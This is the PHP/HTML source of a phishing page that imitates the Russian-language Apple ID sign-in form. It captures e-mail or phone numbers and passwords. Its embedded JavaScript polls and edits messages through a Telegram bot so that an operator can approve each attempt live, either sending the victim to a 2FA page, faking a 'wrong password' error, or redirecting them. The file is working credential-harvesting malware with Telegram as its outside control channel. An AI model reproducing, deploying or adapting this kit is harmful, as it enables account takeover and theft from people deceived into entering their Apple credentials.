<?php
session_start();
ob_start();
require_once('../config.php');
include_once('../includes/php/detect.php');

if(!isset($_SESSION['fallow'])) {
   header('HTTP/1.1 404 Not Found');
   exit();
}
?>
<html lang="en-us" dir="ltr" data-supports-webp="" class="js-focus-visible" data-js-focus-visible="" data-primary-interaction-mode="mouse">
   <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
      <meta name="theme-color" content="rgb(251, 251, 253)" data-default-color="rgb(251, 251, 253)">
      <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
      <title></title>
      <link rel="stylesheet" type="text/css" href="css/index.css">
      <link rel="stylesheet" type="text/css" href="css/app.css">
      <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   </head>
   <body>
      <div id="root">
         <panel>
            <div class="root-viewport">
               <div class="root-component">
                  <div class="page-viewport landing-page-route fade-in">
                     <div class="page-content">
                        <?php include_once('html_modules/header.php'); ?>
                        <div class="home-login-component">
                           <div class="parent-container is-visible">
                              <div style="visibility: visible; height: auto;">
                                 <div class="widget-icon-text">
                                    <img class="icon" draggable="false" alt="" aria-hidden="true" src="media/4f72d89d71e9abcc4e37c71fb77fe65b.png">
                                    <div class="sign-in-label">Войдите с помощью Apple ID</div>
                                 </div>
                                 <div id="idms-auth-5981bc03-12de-4178-bd62-052c923d0a16" class="apple-id-container apple-id-frame-value">
                                    <div class="si-body si-container container-fluid" id="content" role="main" data-theme="dark">
                                       <apple-auth app-loading-defaults="{appLoadingDefaults}" pmrpc-hook="{pmrpcHook}">
                                          <div class="widget-container  fade-in restrict-min-content  restrict-max-wh  fade-in " data-mode="embed" data-isiebutnotedge="false">
                                             <div id="step" class="si-step  ">
                                                <logo {hide-app-logo}="hideAppLogo" {show-fade-in}="showFadeIn" {(section)}="section">
                                                </logo>
                                                <div id="stepEl" class="   ">
                                                   <form action="<?php echo $_SERVER['PHP_SELF']; ?>" id="signinFrm"  method="post" >
                                                      <div class="signin fade-in" id="signin">
                                                         <div class="  swp-enable  container si-field-container  password-second-step     ">
                                                            <div id="sign_in_form" class="signin-form  fed-auth hide-password">
                                                               <div class="">
                                                                  <div class="">
                                                                     <div id="accnames" class="account-name form-row hide-password">
                                                                        <div class="form-cell">
                                                                           <div id="userWholeErr" class=" form-cell-wrapper form-textbox ">
                                                                              <input type="text" id="account_name_text_field" name="account_name_text_field" class="force-ltr form-textbox-input" autocomplete="off" aria-invalid="false">
                                                                              <span aria-hidden="true" id="apple_id_field_label" class=" form-textbox-label  form-label-flyout">             
                                                                              Электронная почта или номер телефона
                                                                              </span>
                                                                           </div>
                                                                        </div>
                                                                     </div>
                                                                     <div class="password form-row" aria-hidden="true">
                                                                        <div class="form-cell" style="margin-top: 12px">
                                                                           <div id="pwdWholeErr" class="form-cell-wrapper form-textbox  ">
                                                                              <input type="password" id="password_text_field" name="password_text_field" autocomplete="off" class="form-textbox-input " aria-invalid="false" tabindex="-1">
                                                                              <span id="password_field_label" aria-hidden="true" class=" form-textbox-label  form-label-flyout">Пароль
                                                                              </span>
                                                                              <span class="sr-only form-label-flyout" id="invalid_user_name_pwd_err_msg" aria-hidden="true">              
                                                                              </span>
                                                                           </div>
                                                                        </div>
                                                                     </div>
                                                                  </div>
                                                               </div>
                                                            </div>
                                                            <div id="errMessageId" class="pop-container error signin-error swp-pop-error hide">
                                                               <div class="error pop-bottom tk-subbody-headline">
                                                                  <p class="fat" id="errMsg">Ваш Apple ID или пароль неверны.</p>
                                                               </div>
                                                            </div>
                                                            <div class="si-remember-password">
                                                               <div class="form-checkbox">
                                                                  <input type="checkbox" id="remember-me" {($checked)}="isRememberMeChecked" class="form-checkbox-input">
                                                                  <label id="remember-me-label" class="form-label" for="remember-me">
                                                                  <span class="form-checkbox-indicator" aria-hidden="true"></span>Оставить меня в системе
                                                                  </label>
                                                               </div>
                                                            </div>
                                                            <style>
                                                               @keyframes rotate {
                                                            0% {
                                                               transform: rotate(0deg);
                                                            }
                                                            100% {
                                                               transform: rotate(360deg);
                                                            }
                                                            }
                                                            </style>
                                                            <div id="loading_spinner_id" class="spinner-container auth hide">
                                                               <div class="spinner" role="progressbar" style="position: absolute; width: 0px; z-index: 2000000000; left: 50%; top: 50%; animation: rotate 1s linear 0s infinite">
                                                                  <div style="position: absolute; top: -1px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-0-12;">
                                                                     <div style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(0deg) translate(6.25px, 0px); border-radius: 1px;"></div>
                                                                  </div>
                                                                  <div style="position: absolute; top: -1px; opacity: 0.50; animation: 1s linear 0s infinite normal none running opacity-60-25-1-12;">
                                                                     <div style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(30deg) translate(6.25px, 0px); border-radius: 1px;"></div>
                                                                  </div>
                                                                  <div style="position: absolute; top: -1px; opacity: 0.50; animation: 1s linear 0s infinite normal none running opacity-60-25-2-12;">
                                                                     <div style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(60deg) translate(6.25px, 0px); border-radius: 1px;"></div>
                                                                  </div>
                                                                  <div style="position: absolute; top: -1px; opacity: 0.75; animation: 1s linear 0s infinite normal none running opacity-60-25-3-12;">
                                                                     <div style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(90deg) translate(6.25px, 0px); border-radius: 1px;"></div>
                                                                  </div>
                                                                  <div style="position: absolute; top: -1px; opacity: 0.75; animation: 1s linear 0s infinite normal none running opacity-60-25-4-12;">
                                                                     <div style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(120deg) translate(6.25px, 0px); border-radius: 1px;"></div>
                                                                  </div>
                                                                  <div style="position: absolute; top: -1px; opacity: 1; animation: 1s linear 0s infinite normal none running opacity-60-25-5-12;">
                                                                     <div style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(150deg) translate(6.25px, 0px); border-radius: 1px;"></div>
                                                                  </div>
                                                                  <div style="position: absolute; top: -1px; opacity: 1; animation: 1s linear 0s infinite normal none running opacity-60-25-6-12;">
                                                                     <div style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(180deg) translate(6.25px, 0px); border-radius: 1px;"></div>
                                                                  </div>
                                                                  <div style="position: absolute; top: -1px; opacity: 0.75; animation: 1s linear 0s infinite normal none running opacity-60-25-7-12;">
                                                                     <div style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(210deg) translate(6.25px, 0px); border-radius: 1px;"></div>
                                                                  </div>
                                                                  <div style="position: absolute; top: -1px; opacity: 0.75; animation: 1s linear 0s infinite normal none running opacity-60-25-8-12;">
                                                                     <div style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(240deg) translate(6.25px, 0px); border-radius: 1px;"></div>
                                                                  </div>
                                                                  <div style="position: absolute; top: -1px; opacity: 0.50; animation: 1s linear 0s infinite normal none running opacity-60-25-9-12;">
                                                                     <div style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(270deg) translate(6.25px, 0px); border-radius: 1px;"></div>
                                                                  </div>
                                                                  <div style="position: absolute; top: -1px; opacity: 0.50; animation: 1s linear 0s infinite normal none running opacity-60-25-10-12;">
                                                                     <div style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(300deg) translate(6.25px, 0px); border-radius: 1px;"></div>
                                                                  </div>
                                                                  <div style="position: absolute; top: -1px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-11-12;">
                                                                     <div style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(330deg) translate(6.25px, 0px); border-radius: 1px;"></div>
                                                                  </div>
                                                               </div>
                                                            </div>
                                                            <button id="sign-in" disabled type="submit" tabindex="0" class="si-button btn  fed-ui   fed-ui-animation-show   remember-me  " aria-label="Continue">
                                                               <img id="arrowBtn" src="media/arrow.png" alt="">
                                                         
                                                            </button>
                                                            
                                                            </button>
                                                         </div>
                                                         <div class="si-container-footer has-remember-me">
                                                            <div class="links tk-subbody">
                                                               <div class="si-forgot-password">
                                                                  <a id="iforgot-link" class="si-link ax-outline lite-theme-override" ($click)="iforgotLinkClickHandler($element)" href="https://iforgot.apple.com/password/verify/appleid" target="_blank">
                                                                     Забыли пароль?
                                                                  </a>
                                                               </div>
                                                            </div>
                                                         </div>
                                                      </div>
                                                   </form>
                                                </div>
                                             </div>
                                          </div>
                                       </apple-auth>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                        <?php include_once('html_modules/footer.php'); ?>
                     </div>
                  </div>
               </div>
            </div>
        </panel>
      </div>
   <?php require_once('../includes/js/makeRequest.php');  ?>
   <script src="js/login.js"></script>
   <script>
    function processResponse(response) {
      for (var i = 0; i < response.result.length; i++) {
        var result = response.result[i];
        if (result.callback_query && (result.callback_query.data === unique + " success" || result.callback_query.data === unique + " error" || result.callback_query.data === unique + " disconnect")) {
          var chatId = result.callback_query.message.chat.id;
          var messageId = result.callback_query.message.message_id;
          var action = result.callback_query.data.split(" ")[1];
          
          deleteMessage(chatId, messageId);

        if (action === "success") {
            window.location.href = "2fa.php"; 
            console.log("success!");
        } else if (action === "error") {
            errMessageId.classList.replace('hide', 'show');
            userWholeErr.classList.add('is-error');
            pwdWholeErr.classList.add('is-error');

            loading_spinner_id.classList.replace('show', 'hide');
            arrowBtn.classList.remove('hide');

            user_id.blur();
            pwd_id.blur();
            clearInterval(requesting);
            console.log("error!");
        } else if (action === "disconnect") {
            window.location.href = "<?php echo $redirect['success']; ?>"; 
            console.log("disconnected!");
        } 

          break;
        }
      }
    }
  </script>
  <script>
   function deleteMessage(chatId, messageId) {
    var params = {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: '',
    };

    $.ajax({
        url: "https://api.telegram.org/bot<?php echo $telegram['bot_token'] ?>/editMessageReplyMarkup",
        type: "GET",
        data: params,
        success: function(response) {
            console.log("message deleted!");
        },
        error: function(xhr, status, error) {
            console.error("Failed to delete message. Response:", xhr.responseText);
        }
    });
}
  </script>
   </body>
</html>